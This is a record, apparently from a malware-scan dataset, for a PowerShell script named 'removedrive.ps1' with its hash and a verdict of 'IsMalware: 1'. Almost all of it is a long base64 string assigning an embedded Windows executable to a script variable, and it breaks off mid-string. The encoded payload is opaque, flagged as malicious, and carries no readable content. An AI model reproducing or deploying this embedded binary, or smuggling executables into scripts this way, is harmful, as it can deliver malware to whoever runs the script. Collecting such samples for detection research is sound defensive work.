removedrive.ps1,4bc340ef20600c82b83e739a8291e31f,Scan result is 32768. IsMalware: 1,$InputString = "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